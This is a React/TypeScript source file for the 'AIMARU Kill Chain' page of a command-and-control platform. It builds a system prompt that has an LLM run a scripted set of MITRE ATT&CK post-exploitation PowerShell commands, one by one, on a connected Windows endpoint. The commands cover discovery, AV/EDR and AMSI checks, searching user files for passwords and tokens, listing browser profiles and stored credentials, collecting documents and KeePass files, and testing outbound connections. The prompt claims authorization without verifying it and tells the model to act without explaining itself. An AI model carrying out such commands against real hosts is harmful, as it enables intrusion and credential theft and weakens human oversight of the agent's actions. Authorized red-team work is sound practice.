import React, { useState, useEffect, useMemo, useRef } from 'react'
import { useAuth } from '../auth/AuthContext'

// ─── Types ────────────────────────────────────────────────────────────────────

type TacticStatus = 'pending' | 'active' | 'complete'

interface ATTACKTechnique {
  id: string
  name: string
}

interface ATTACKTactic {
  id: string
  name: string
  color: string
  techniques: ATTACKTechnique[]
}

interface ChatMessage {
  id: string
  session_id: string
  role: 'user' | 'assistant' | 'system' | 'tool'
  content: string
  tool_name?: string
  tool_args?: string
  created_at: string
}

interface ParsedTTPs {
  discoveredTechniques: Set<string>
  completedTactics: Set<string>
  activeTacticId: string | null
}

interface TTPLogEntry {
  techniqueId: string
  tacticId: string
  techniqueName: string
  timestamp: string
}

// ─── MITRE ATT&CK Data ────────────────────────────────────────────────────────

const ATTACK_TACTICS: ATTACKTactic[] = [
  {
    id: 'TA0007', name: 'Discovery', color: '#00E5CC',
    techniques: [
      { id: 'T1082', name: 'System Information' },
      { id: 'T1016', name: 'Network Configuration' },
      { id: 'T1049', name: 'Network Connections' },
      { id: 'T1069', name: 'Permission Groups' },
      { id: 'T1057', name: 'Process Discovery' },
      { id: 'T1518', name: 'Software Discovery' },
      { id: 'T1007', name: 'System Services' },
      { id: 'T1012', name: 'Query Registry' },
    ]
  },
  {
    id: 'TA0004', name: 'Privilege Escalation', color: '#F59E0B',
    techniques: [
      { id: 'T1053', name: 'Scheduled Task/Job' },
      { id: 'T1134', name: 'Token Manipulation' },
      { id: 'T1078', name: 'Valid Accounts' },
      { id: 'T1068', name: 'Unquoted Service Path' },
    ]
  },
  {
    id: 'TA0005', name: 'Defense Evasion', color: '#A855F7',
    techniques: [
      { id: 'T1562', name: 'Impair Defenses (AV/EDR)' },
      { id: 'T1070', name: 'Indicator Removal' },
      { id: 'T1027', name: 'AMSI Bypass Check' },
    ]
  },
  {
    id: 'TA0006', name: 'Credential Access', color: '#EF4444',
    techniques: [
      { id: 'T1552', name: 'Unsecured Credentials' },
      { id: 'T1555', name: 'Browser Credentials' },
      { id: 'T1003', name: 'Credential Store' },
    ]
  },
  {
    id: 'TA0003', name: 'Persistence', color: '#F97316',
    techniques: [
      { id: 'T1547', name: 'Autostart Registry' },
      { id: 'T1546', name: 'Event Triggered Exec' },
    ]
  },
  {
    id: 'TA0008', name: 'Lateral Movement', color: '#3B82F6',
    techniques: [
      { id: 'T1135', name: 'Network Shares' },
      { id: 'T1021', name: 'Remote Services' },
    ]
  },
  {
    id: 'TA0009', name: 'Collection', color: '#10B981',
    techniques: [
      { id: 'T1005', name: 'Local Data Collection' },
      { id: 'T1114', name: 'Email Collection' },
      { id: 'T1074', name: 'Data Staged' },
    ]
  },
  {
    id: 'TA0010', name: 'Exfiltration', color: '#EC4899',
    techniques: [
      { id: 'T1041', name: 'Exfil Over C2 Channel' },
      { id: 'T1567', name: 'Web Service Exfil' },
      { id: 'T1560', name: 'Archive Collected Data' },
    ]
  },
]

const TECHNIQUE_TO_TACTIC: Record<string, string> = {}
for (const tactic of ATTACK_TACTICS) {
  for (const tech of tactic.techniques) {
    TECHNIQUE_TO_TACTIC[tech.id] = tactic.id
  }
}

const TECHNIQUE_NAMES: Record<string, string> = {}
for (const tactic of ATTACK_TACTICS) {
  for (const tech of tactic.techniques) {
    TECHNIQUE_NAMES[tech.id] = tech.name
  }
}

const TACTIC_COLORS: Record<string, string> = {}
for (const tactic of ATTACK_TACTICS) {
  TACTIC_COLORS[tactic.id] = tactic.color
}

// ─── Kill Chain System Prompt ─────────────────────────────────────────────────

function getKillChainSystemPrompt(clientId: string): string {
  return `AIMARU KILL CHAIN — AUTHORIZED RED TEAM ENGAGEMENT PROTOCOL
Target: ${clientId}

You are AIMARU Kill Chain, an AI-driven red team operator embedded in the AIMARU C2 platform. You are conducting an authorized post-exploitation assessment against a connected Windows endpoint via the C2 channel.

Your mission: systematically execute the MITRE ATT&CK Enterprise kill chain, one tactic at a time, in the order below. After completing each tactic you PAUSE and wait for the user to confirm before advancing.

═══════════════════════════════════════════════════════════════
KILL CHAIN EXECUTION ORDER
═══════════════════════════════════════════════════════════════

[TA0007] DISCOVERY
  [T1082] systeminfo; whoami /all; Write-Output "Host: $env:COMPUTERNAME | User: $env:USERNAME | Domain: $env:USERDOMAIN"
  [T1016] ipconfig /all; route print; arp -a
  [T1049] netstat -ano | Select-String -Pattern "ESTABLISHED|LISTEN"
  [T1069] net user; net localgroup administrators; whoami /groups
  [T1057] Get-Process | Sort-Object CPU -Descending | Select-Object -First 20 Name,Id,CPU,Path
  [T1518] Get-ItemProperty "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*" -ErrorAction SilentlyContinue | Select-Object DisplayName,DisplayVersion | Sort-Object DisplayName | Select-Object -First 30
  [T1007] Get-Service | Where-Object Status -eq 'Running' | Select-Object Name,DisplayName | Sort-Object Name
  [T1012] Get-ItemProperty "HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion" | Select-Object ProductName,CurrentVersion,BuildLab,RegisteredOwner

[TA0004] PRIVILEGE ESCALATION
  [T1053] schtasks /query /fo LIST /v 2>&1 | Select-String -Pattern "Task Name|Run As User|Status" | Select-Object -First 30
  [T1134] whoami /priv
  [T1078] net user; net localgroup administrators
  [T1068] Get-WmiObject Win32_Service -ErrorAction SilentlyContinue | Where-Object { $_.PathName -and $_.PathName -notmatch '"' -and $_.PathName -match ' ' } | Select-Object Name,PathName,StartMode

[TA0005] DEFENSE EVASION
  [T1562] Get-WmiObject -Namespace "root/SecurityCenter2" -Class AntiVirusProduct -ErrorAction SilentlyContinue | Select-Object displayName,productState; Get-Service -ErrorAction SilentlyContinue | Where-Object { $_.Name -match 'sense|windefend|cyserver|cb|falconhost|xagt|bdredline' } | Select-Object Name,Status
  [T1070] Get-EventLog -LogName Security -Newest 5 -ErrorAction SilentlyContinue | Select-Object TimeGenerated,EventID | Format-Table -AutoSize
  [T1027] try { $f=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static'); "amsiInitFailed=$($f.GetValue($null))" } catch { "AMSI reflection check: $_" }

[TA0006] CREDENTIAL ACCESS
  [T1552] Get-ChildItem C:\\Users -Recurse -Include *.xml,*.txt,*.json,*.config,*.ini -ErrorAction SilentlyContinue | Select-String -Pattern "pass|pwd|password|credential|secret|token" -CaseSensitive:$false | Select-Object -First 15 Path,LineNumber,Line
  [T1555] Get-ChildItem "$env:LOCALAPPDATA\\Google\\Chrome\\User Data" -ErrorAction SilentlyContinue | Select-Object Name; Get-ChildItem "$env:APPDATA\\Mozilla\\Firefox\\Profiles" -ErrorAction SilentlyContinue | Select-Object Name
  [T1003] cmdkey /list

[TA0003] PERSISTENCE
  [T1547] Get-ItemProperty "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" -ErrorAction SilentlyContinue; Get-ItemProperty "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" -ErrorAction SilentlyContinue
  [T1546] Get-WmiObject -Class __EventFilter -Namespace root\\subscription -ErrorAction SilentlyContinue | Select-Object Name,Query

[TA0008] LATERAL MOVEMENT
  [T1135] net share; Get-SmbShare -ErrorAction SilentlyContinue | Select-Object Name,Path,Description
  [T1021] Get-Service -Name WinRM,RemoteRegistry,TermService -ErrorAction SilentlyContinue | Select-Object Name,Status; (Get-ItemProperty "HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" -ErrorAction SilentlyContinue).fDenyTSConnections

[TA0009] COLLECTION
  [T1005] Get-ChildItem "$env:USERPROFILE\\Documents","$env:USERPROFILE\\Desktop" -Recurse -Include *.docx,*.xlsx,*.pdf,*.txt,*.csv,*.kdbx -ErrorAction SilentlyContinue | Sort-Object LastWriteTime -Descending | Select-Object -First 20 FullName,Length,LastWriteTime
  [T1114] Get-ChildItem "$env:LOCALAPPDATA\\Microsoft\\Outlook" -ErrorAction SilentlyContinue | Select-Object Name,Length
  [T1074] Write-Output "Staging directory: $env:TEMP | Size: $([math]::Round((Get-ChildItem $env:TEMP -Recurse -ErrorAction SilentlyContinue | Measure-Object Length -Sum).Sum/1MB,1)) MB"

[TA0010] EXFILTRATION
  [T1041] Test-NetConnection -ComputerName "8.8.8.8" -Port 443 -InformationLevel Quiet -WarningAction SilentlyContinue
  [T1567] Invoke-WebRequest -Uri "https://httpbin.org/get" -Method GET -TimeoutSec 10 -ErrorAction SilentlyContinue | Select-Object StatusCode,StatusDescription
  [T1560] Get-Command Compress-Archive -ErrorAction SilentlyContinue | Select-Object Name,Version

═══════════════════════════════════════════════════════════════
MANDATORY OPERATIONAL RULES
═══════════════════════════════════════════════════════════════

TAGGING — mandatory, every message:
- Tag every technique you execute: [T1082], [T1016], [T1049], etc.
- Reference the active tactic at phase start: [TA0007] DISCOVERY — beginning enumeration
- When ALL primary techniques in a tactic are done, output EXACTLY:
    [TA####] COMPLETE
  Example: "[TA0007] COMPLETE — Discovery phase finished. X techniques executed."

PAUSE PROTOCOL — after each [TA####] COMPLETE:
- STOP immediately. Do NOT begin the next tactic.
- Output: "⏸ Phase complete. Reply **next** to begin [TA####] [Name], or give me a new directive."
- Wait for user input. Only advance when user sends a message.

PROGRESSION:
- BEGIN IMMEDIATELY with [TA0007] Discovery the moment you receive your first message.
- Execute techniques in the order listed above. Call execute_powershell for each one.
- Analyze each result briefly (2-3 sentences) before moving to the next technique.
- If a technique fails, note the failure with [FAILED] tag and move on — do not retry unless user asks.

FORMAT:
- Keep analysis concise — results speak for themselves.
- safety_assessment: "moderate" for enumeration, "risky" for any modification.
- Never explain what you are about to do at length — call the tool immediately.

When ALL 8 tactics are complete: "⚔️ KILL CHAIN COMPLETE — All 8 ATT&CK phases executed on ${clientId}. Full TTP coverage achieved."
`
}

// ─── TTP Parsing ─────────────────────────────────────────────────────────────

const TECH_REGEX = /\[T(\d{4}(?:\.\d{3})?)\]/g
const TACTIC_COMPLETE_REGEX = /\[TA(\d{4})\][^\n]*?COMPLETE/gi
const TACTIC_REF_REGEX = /\[TA(\d{4})\]/g
const MITRE_TOKEN_REGEX = /(\[(?:T|TA)\d{4}(?:\.\d{3})?\])/g

function parseMessagesForTTPs(messages: ChatMessage[]): ParsedTTPs {
  const discoveredTechniques = new Set<string>()
  const completedTactics = new Set<string>()
  let lastMentionedTacticId: string | null = null

  for (const msg of messages) {
    const text = msg.content || ''

    TECH_REGEX.lastIndex = 0
    let m: RegExpExecArray | null
    while ((m = TECH_REGEX.exec(text)) !== null) {
      discoveredTechniques.add(`T${m[1]}`)
    }

    TACTIC_COMPLETE_REGEX.lastIndex = 0
    while ((m = TACTIC_COMPLETE_REGEX.exec(text)) !== null) {
      completedTactics.add(`TA${m[1]}`)
    }

    TACTIC_REF_REGEX.lastIndex = 0
    while ((m = TACTIC_REF_REGEX.exec(text)) !== null) {
      const tid = `TA${m[1]}`
      if (!completedTactics.has(tid)) {
        lastMentionedTacticId = tid
      }
    }
  }

  let activeTacticId: string | null = null
  for (const tactic of ATTACK_TACTICS) {
    if (!completedTactics.has(tactic.id)) {
      if (lastMentionedTacticId === tactic.id) {
        activeTacticId = tactic.id
      }
      break
    }
  }

  return { discoveredTechniques, completedTactics, activeTacticId }
}

function getTacticStatus(tacticId: string, parsed: ParsedTTPs): TacticStatus {
  if (parsed.completedTactics.has(tacticId)) return 'complete'
  if (parsed.activeTacticId === tacticId) return 'active'
  return 'pending'
}

function buildTTPLog(messages: ChatMessage[]): TTPLogEntry[] {
  const seen = new Map<string, TTPLogEntry>()
  for (const msg of messages) {
    const text = msg.content || ''
    TECH_REGEX.lastIndex = 0
    let m: RegExpExecArray | null
    while ((m = TECH_REGEX.exec(text)) !== null) {
      const techId = `T${m[1]}`
      if (!seen.has(techId)) {
        seen.set(techId, {
          techniqueId: techId,
          tacticId: TECHNIQUE_TO_TACTIC[techId] || 'Unknown',
          techniqueName: TECHNIQUE_NAMES[techId] || techId,
          timestamp: msg.created_at
        })
      }
    }
  }
  return Array.from(seen.values())
}

function renderMessageContent(content: string): React.ReactNode[] {
  const parts = content.split(MITRE_TOKEN_REGEX)
  return parts.map((part, i) => {
    if (MITRE_TOKEN_REGEX.test(part)) {
      MITRE_TOKEN_REGEX.lastIndex = 0
      const isTactic = part.startsWith('[TA')
      const color = isTactic ? '#EF4444' : '#00E5CC'
      return (
        <span key={i}
          className="inline-block mx-0.5 px-1 rounded font-bold font-mono"
          style={{
            fontSize: '11px',
            background: isTactic ? 'rgba(239,68,68,0.15)' : 'rgba(0,229,204,0.15)',
            border: `1px solid ${color}`,
            color,
            verticalAlign: 'middle'
          }}>
          {part}
        </span>
      )
    }
    return <span key={i}>{part}</span>
  })
}

// ─── Sub-components ───────────────────────────────────────────────────────────

function TacticProgressBar({ parsed }: { parsed: ParsedTTPs }) {
  return (
    <div className="rounded-xl p-4"
         style={{ background: 'var(--aimaru-dark-card)', border: '1px solid rgba(239,68,68,0.3)' }}>
      <p className="text-xs font-mono uppercase tracking-widest mb-3" style={{ color: 'var(--aimaru-text-dim)' }}>
        ATT&CK Kill Chain Progress
      </p>
      <div className="flex gap-2 overflow-x-auto pb-1">
        {ATTACK_TACTICS.map(tactic => {
          const status = getTacticStatus(tactic.id, parsed)
          const discovered = tactic.techniques.filter(t => parsed.discoveredTechniques.has(t.id)).length
          const isActive = status === 'active'
          const isComplete = status === 'complete'
          const color = isComplete ? '#10B981' : isActive ? tactic.color : 'var(--aimaru-dark-border)'
          const textColor = isComplete ? '#10B981' : isActive ? tactic.color : 'var(--aimaru-text-dim)'
          return (
            <div key={tactic.id}
                 className={`flex-shrink-0 px-3 py-2 rounded-lg transition-all ${isActive ? 'pulse-tactic' : ''}`}
                 style={{
                   background: isComplete
                     ? 'rgba(16,185,129,0.12)'
                     : isActive
                       ? `${tactic.color}18`
                       : 'rgba(45,55,72,0.4)',
                   border: `1px solid ${color}`,
                   minWidth: '110px'
                 }}>
              <div className="flex items-center gap-1 text-xs font-bold font-mono" style={{ color: textColor }}>
                {isComplete && <span>✓</span>}
                {isActive && <span>▶</span>}
                <span>{tactic.id}</span>
              </div>
              <div className="font-mono mt-0.5" style={{ fontSize: '10px', color: textColor, opacity: 0.85 }}>
                {tactic.name}
              </div>
              {discovered > 0 && (
                <div className="font-mono mt-0.5" style={{ fontSize: '10px', color: textColor, opacity: 0.65 }}>
                  {discovered}/{tactic.techniques.length} TTPs
                </div>
              )}
            </div>
          )
        })}
      </div>
    </div>
  )
}

function TTPLogPanel({ log }: { log: TTPLogEntry[] }) {
  return (
    <div className="rounded-xl overflow-hidden flex flex-col"
         style={{ border: '1px solid var(--aimaru-dark-border)', height: '100%' }}>
      <div className="px-4 py-2 flex-shrink-0"
           style={{ background: 'rgba(0,229,204,0.08)', borderBottom: '1px solid var(--aimaru-dark-border)' }}>
        <span className="text-xs font-bold uppercase tracking-wide font-mono" style={{ color: '#00E5CC' }}>
          TTP Execution Log — {log.length} technique{log.length !== 1 ? 's' : ''}
        </span>
      </div>
      <div className="overflow-y-auto flex-1" style={{ maxHeight: '480px' }}>
        {log.length === 0 ? (
          <p className="p-4 text-xs font-mono text-center" style={{ color: 'var(--aimaru-text-dim)' }}>
            No techniques executed yet.<br />Start the Kill Chain to begin.
          </p>
        ) : (
          <table className="w-full text-xs font-mono">
            <thead>
              <tr style={{ background: 'rgba(0,0,0,0.4)', color: 'var(--aimaru-text-dim)' }}>
                <th className="px-3 py-1.5 text-left">TTP</th>
                <th className="px-3 py-1.5 text-left">Name</th>
                <th className="px-3 py-1.5 text-left">Tactic</th>
              </tr>
            </thead>
            <tbody>
              {log.map((entry, i) => {
                const tacticColor = TACTIC_COLORS[entry.tacticId] || 'var(--aimaru-text-dim)'
                const tacticObj = ATTACK_TACTICS.find(t => t.id === entry.tacticId)
                return (
                  <tr key={entry.techniqueId}
                      style={{
                        background: i % 2 === 0 ? 'rgba(0,0,0,0.2)' : 'rgba(0,0,0,0.1)',
                        borderBottom: '1px solid rgba(255,255,255,0.04)'
                      }}>
                    <td className="px-3 py-1.5">
                      <span className="px-1.5 py-0.5 rounded font-bold"
                            style={{ background: `${tacticColor}18`, border: `1px solid ${tacticColor}55`, color: tacticColor }}>
                        {entry.techniqueId}
                      </span>
                    </td>
                    <td className="px-3 py-1.5" style={{ color: 'var(--aimaru-text)' }}>
                      {entry.techniqueName}
                    </td>
                    <td className="px-3 py-1.5" style={{ color: tacticColor, fontSize: '10px' }}>
                      {tacticObj?.name || entry.tacticId}
                    </td>
                  </tr>
                )
              })}
            </tbody>
          </table>
        )}
      </div>
    </div>
  )
}

// ─── Main Component ───────────────────────────────────────────────────────────

export default function KillChain() {
  const { token } = useAuth()

  const [clients, setClients] = useState<{ id: string; connected: boolean }[]>([])
  const [llmConfigs, setLlmConfigs] = useState<{ id: string; name: string; model: string; is_active: boolean }[]>([])
  const [selectedClient, setSelectedClient] = useState('')
  const [selectedLLM, setSelectedLLM] = useState('')

  const [sessionId, setSessionId] = useState<string | null>(null)
  const [starting, setStarting] = useState(false)
  const [err, setErr] = useState('')

  const [messages, setMessages] = useState<ChatMessage[]>([])
  const [newMessage, setNewMessage] = useState('')
  const [sending, setSending] = useState(false)

  const parsedTTPs = useMemo(() => parseMessagesForTTPs(messages), [messages])
  const ttpLog = useMemo(() => buildTTPLog(messages), [messages])
  const killChainComplete = parsedTTPs.completedTactics.size === ATTACK_TACTICS.length

  const messagesEndRef = useRef<HTMLDivElement>(null)

  const authH = () => ({
    'Authorization': `Bearer ${token}`,
    'Content-Type': 'application/json'
  })

  useEffect(() => { if (token) loadData() }, [token])

  useEffect(() => {
    if (!sessionId) return
    const id = setInterval(() => loadSessionMessages(sessionId), 3000)
    return () => clearInterval(id)
  }, [sessionId])

  useEffect(() => {
    messagesEndRef.current?.scrollIntoView({ behavior: 'smooth' })
  }, [messages])

  async function loadData() {
    try {
      const [cRes, lRes] = await Promise.all([
        fetch('/api/clients', { headers: authH() }),
        fetch('/api/llm/configs', { headers: authH() })
      ])
      if (cRes.ok) {
        const d = await cRes.json()
        setClients(d.clients || [])
      }
      if (lRes.ok) {
        const d = await lRes.json()
        const cfgs = d.configs || []
        setLlmConfigs(cfgs)
        if (!selectedLLM) {
          const active = cfgs.find((c: any) => c.is_active)
          if (active) setSelectedLLM(active.id)
        }
      }
    } catch (e) {
      console.error('loadData failed', e)
    }
  }

  async function loadSessionMessages(sid: string) {
    try {
      const res = await fetch(`/api/chat/sessions/${sid}/messages`, { headers: authH() })
      if (res.ok) {
        const d = await res.json()
        setMessages(d.messages || [])
      }
    } catch (e) {
      console.error('loadSessionMessages failed', e)
    }
  }

  async function startKillChain() {
    if (!selectedClient || !selectedLLM) return
    setStarting(true)
    setErr('')
    setMessages([])
    try {
      const sessionRes = await fetch('/api/chat/sessions', {
        method: 'POST',
        headers: authH(),
        body: JSON.stringify({
          client_id: selectedClient,
          llm_config_id: selectedLLM,
          system_prompt: getKillChainSystemPrompt(selectedClient)
        })
      })
      if (!sessionRes.ok) throw new Error(`Session creation failed: ${sessionRes.status}`)
      const session = await sessionRes.json()
      setSessionId(session.id)

      await fetch('/api/chat/message', {
        method: 'POST',
        headers: authH(),
        body: JSON.stringify({
          session_id: session.id,
          message: 'Begin AIMARU Kill Chain. Start [TA0007] Discovery now — execute [T1082] immediately.'
        })
      })

      await loadSessionMessages(session.id)
    } catch (e: any) {
      setErr(`Failed to start: ${e.message}`)
    } finally {
      setStarting(false)
    }
  }

  async function sendMessage() {
    if (!sessionId || !newMessage.trim() || sending) return
    setSending(true)
    const msg = newMessage.trim()
    setNewMessage('')
    try {
      await fetch('/api/chat/message', {
        method: 'POST',
        headers: authH(),
        body: JSON.stringify({ session_id: sessionId, message: msg })
      })
      await loadSessionMessages(sessionId)
    } catch (e) {
      console.error('sendMessage failed', e)
    } finally {
      setSending(false)
    }
  }

  const connectedClients = clients.filter(c => c.connected)

  return (
    <div className="min-h-screen p-6" style={{ background: 'var(--aimaru-dark-bg)' }}>

      {/* ── Header ── */}
      <div className="mb-6">
        <div className="flex items-center gap-4 mb-2">
          <span className="text-4xl">⚔️</span>
          <div>
            <h1 className="text-3xl font-bold uppercase tracking-widest"
                style={{ color: '#EF4444', textShadow: '0 0 20px rgba(239,68,68,0.5)' }}>
              AIMARU Kill Chain
            </h1>
            <p className="text-sm font-mono mt-1" style={{ color: 'var(--aimaru-text-dim)' }}>
              MITRE ATT&CK Enterprise — Autonomous Red Team Kill Chain
            </p>
          </div>
        </div>
        <div className="h-px mt-4" style={{ background: 'linear-gradient(90deg, #EF4444, transparent)' }} />
      </div>

      {/* ── Setup panel (hidden once session is active) ── */}
      {!sessionId && (
        <div className="rounded-xl p-6 mb-6"
             style={{ background: 'var(--aimaru-dark-card)', border: '1px solid rgba(239,68,68,0.4)' }}>
          <h2 className="text-sm font-bold uppercase tracking-wide mb-4" style={{ color: '#EF4444' }}>
            Engagement Configuration
          </h2>
          <div className="flex flex-wrap gap-4 items-end">
            <div className="flex-1 min-w-48">
              <label className="block text-xs font-mono uppercase tracking-wide mb-1"
                     style={{ color: 'var(--aimaru-text-dim)' }}>Target Client</label>
              <select
                value={selectedClient}
                onChange={e => setSelectedClient(e.target.value)}
                className="w-full px-3 py-2 rounded-lg text-sm font-mono"
                style={{ background: 'rgba(0,0,0,0.4)', border: '1px solid var(--aimaru-dark-border)', color: 'var(--aimaru-text)', outline: 'none' }}>
                <option value="">— select connected client —</option>
                {connectedClients.map(c => (
                  <option key={c.id} value={c.id}>{c.id}</option>
                ))}
              </select>
              {connectedClients.length === 0 && (
                <p className="text-xs font-mono mt-1" style={{ color: '#EF4444' }}>No clients connected</p>
              )}
            </div>

            <div className="flex-1 min-w-48">
              <label className="block text-xs font-mono uppercase tracking-wide mb-1"
                     style={{ color: 'var(--aimaru-text-dim)' }}>LLM Configuration</label>
              <select
                value={selectedLLM}
                onChange={e => setSelectedLLM(e.target.value)}
                className="w-full px-3 py-2 rounded-lg text-sm font-mono"
                style={{ background: 'rgba(0,0,0,0.4)', border: '1px solid var(--aimaru-dark-border)', color: 'var(--aimaru-text)', outline: 'none' }}>
                <option value="">— select LLM config —</option>
                {llmConfigs.map(c => (
                  <option key={c.id} value={c.id}>{c.name} ({c.model})</option>
                ))}
              </select>
            </div>

            <div>
              <button
                onClick={startKillChain}
                disabled={!selectedClient || !selectedLLM || starting}
                className="px-8 py-3 rounded-lg font-bold uppercase tracking-wide text-sm transition-all disabled:opacity-40"
                style={{ background: 'rgba(239,68,68,0.2)', border: '1px solid #EF4444', color: '#EF4444' }}
                onMouseEnter={e => { if (!starting && selectedClient && selectedLLM) (e.currentTarget as HTMLElement).style.background = 'rgba(239,68,68,0.35)'; (e.currentTarget as HTMLElement).style.boxShadow = '0 0 20px rgba(239,68,68,0.4)' }}
                onMouseLeave={e => { (e.currentTarget as HTMLElement).style.background = 'rgba(239,68,68,0.2)'; (e.currentTarget as HTMLElement).style.boxShadow = 'none' }}>
                {starting ? '⏳ INITIATING...' : '⚔️ START KILL CHAIN'}
              </button>
            </div>
          </div>

          {err && (
            <p className="text-xs font-mono mt-3" style={{ color: '#EF4444' }}>{err}</p>
          )}

          {/* Tactic overview (pre-session) */}
          <div className="mt-6 grid grid-cols-2 md:grid-cols-4 gap-2">
            {ATTACK_TACTICS.map(t => (
              <div key={t.id} className="px-3 py-2 rounded-lg text-xs"
                   style={{ background: `${t.color}10`, border: `1px solid ${t.color}30` }}>
                <p className="font-bold font-mono" style={{ color: t.color }}>{t.id}</p>
                <p className="font-mono mt-0.5" style={{ color: 'var(--aimaru-text)' }}>{t.name}</p>
                <p className="font-mono mt-0.5" style={{ color: 'var(--aimaru-text-dim)', fontSize: '10px' }}>
                  {t.techniques.length} techniques
                </p>
              </div>
            ))}
          </div>
        </div>
      )}

      {/* ── ATT&CK Progress Bar (always shown once session starts) ── */}
      {sessionId && (
        <div className="mb-6">
          <TacticProgressBar parsed={parsedTTPs} />
        </div>
      )}

      {/* ── Kill Chain Complete Banner ── */}
      {killChainComplete && (
        <div className="rounded-xl p-5 mb-6 text-center"
             style={{ background: 'rgba(16,185,129,0.1)', border: '1px solid #10B981', boxShadow: '0 0 30px rgba(16,185,129,0.2)' }}>
          <p className="text-xl font-bold uppercase tracking-widest" style={{ color: '#10B981' }}>
            ⚔️ KILL CHAIN COMPLETE
          </p>
          <p className="text-sm font-mono mt-1" style={{ color: 'var(--aimaru-text-dim)' }}>
            All 8 ATT&CK phases executed on {selectedClient} — {ttpLog.length} techniques mapped
          </p>
        </div>
      )}

      {/* ── Main Chat + TTP Log (shown once session active) ── */}
      {sessionId && (
        <div className="grid gap-6" style={{ gridTemplateColumns: '1fr 320px' }}>

          {/* Chat pane */}
          <div className="flex flex-col rounded-xl overflow-hidden"
               style={{ border: '1px solid rgba(239,68,68,0.3)' }}>
            {/* Chat header */}
            <div className="px-4 py-2 flex items-center justify-between flex-shrink-0"
                 style={{ background: 'rgba(239,68,68,0.08)', borderBottom: '1px solid rgba(239,68,68,0.2)' }}>
              <span className="text-xs font-bold uppercase tracking-wide font-mono" style={{ color: '#EF4444' }}>
                ⚔️ Kill Chain Chat — {selectedClient}
              </span>
              <button
                onClick={() => { setSessionId(null); setMessages([]); setSelectedClient(''); }}
                className="text-xs font-mono px-2 py-0.5 rounded transition-all"
                style={{ background: 'rgba(239,68,68,0.1)', border: '1px solid rgba(239,68,68,0.3)', color: '#EF4444' }}>
                ✕ End Session
              </button>
            </div>

            {/* Messages */}
            <div className="flex-1 overflow-y-auto p-4 space-y-3 font-mono text-sm"
                 style={{ minHeight: '420px', maxHeight: '520px', background: 'rgba(0,0,0,0.3)' }}>
              {messages.length === 0 && (
                <p className="text-xs text-center mt-12" style={{ color: 'var(--aimaru-text-dim)' }}>
                  Initiating kill chain on {selectedClient}…
                </p>
              )}
              {messages.map((msg, i) => {
                const isUser = msg.role === 'user'
                const isSystem = msg.role === 'system'
                const isTool = msg.role === 'tool'

                let bg: string, border: string, textColor: string
                if (isUser) {
                  bg = 'rgba(239,68,68,0.12)'; border = 'rgba(239,68,68,0.35)'; textColor = '#EF4444'
                } else if (isSystem) {
                  bg = 'rgba(245,158,11,0.08)'; border = 'rgba(245,158,11,0.25)'; textColor = '#F59E0B'
                } else if (isTool) {
                  bg = 'rgba(168,85,247,0.08)'; border = 'rgba(168,85,247,0.25)'; textColor = '#A855F7'
                } else {
                  bg = 'rgba(0,0,0,0.35)'; border = 'rgba(255,255,255,0.08)'; textColor = 'var(--aimaru-text)'
                }

                return (
                  <div key={msg.id || i} className={`flex ${isUser ? 'justify-end' : 'justify-start'}`}>
                    <div className={`px-3 py-2 rounded-lg text-xs ${isUser ? 'max-w-[75%]' : 'max-w-[90%]'}`}
                         style={{ background: bg, border: `1px solid ${border}`, color: textColor }}>
                      {!isUser && !isTool && (
                        <div className="text-xs font-bold uppercase mb-1 opacity-60"
                             style={{ fontSize: '10px', letterSpacing: '0.1em' }}>
                          {msg.role}
                        </div>
                      )}
                      {isTool && msg.tool_name && (
                        <div className="mb-1 text-xs font-bold" style={{ fontSize: '10px', opacity: 0.7 }}>
                          🔧 {msg.tool_name}
                        </div>
                      )}
                      <div style={{ whiteSpace: 'pre-wrap', wordBreak: 'break-word', lineHeight: '1.5' }}>
                        {msg.role === 'assistant'
                          ? renderMessageContent(msg.content || '')
                          : (msg.content || '')}
                      </div>
                      {isTool && msg.tool_args && (
                        <details className="mt-2">
                          <summary className="cursor-pointer opacity-60 text-xs">Tool args</summary>
                          <pre className="mt-1 text-xs overflow-x-auto opacity-70"
                               style={{ fontSize: '10px' }}>
                            {(() => { try { return JSON.stringify(JSON.parse(msg.tool_args!), null, 2) } catch { return msg.tool_args } })()}
                          </pre>
                        </details>
                      )}
                    </div>
                  </div>
                )
              })}
              <div ref={messagesEndRef} />
            </div>

            {/* Input */}
            <div className="p-3 flex gap-2 flex-shrink-0"
                 style={{ background: 'var(--aimaru-dark-card)', borderTop: '1px solid rgba(239,68,68,0.2)' }}>
              <input
                type="text"
                value={newMessage}
                onChange={e => setNewMessage(e.target.value)}
                onKeyDown={e => { if (e.key === 'Enter' && !e.shiftKey) { e.preventDefault(); sendMessage() } }}
                placeholder='Type "next" to advance to next tactic, or give a directive…'
                disabled={sending}
                className="flex-1 px-3 py-2 rounded-lg text-sm font-mono disabled:opacity-40"
                style={{ background: 'rgba(0,0,0,0.4)', border: '1px solid var(--aimaru-dark-border)', color: 'var(--aimaru-text)', outline: 'none' }}
              />
              <button
                onClick={sendMessage}
                disabled={!newMessage.trim() || sending}
                className="px-5 py-2 rounded-lg font-bold text-sm uppercase tracking-wide transition-all disabled:opacity-40"
                style={{ background: 'rgba(239,68,68,0.2)', border: '1px solid #EF4444', color: '#EF4444' }}
                onMouseEnter={e => { (e.currentTarget as HTMLElement).style.background = 'rgba(239,68,68,0.35)' }}
                onMouseLeave={e => { (e.currentTarget as HTMLElement).style.background = 'rgba(239,68,68,0.2)' }}>
                {sending ? '⏳' : 'Send'}
              </button>
            </div>
          </div>

          {/* TTP Log pane */}
          <TTPLogPanel log={ttpLog} />
        </div>
      )}
    </div>
  )
}
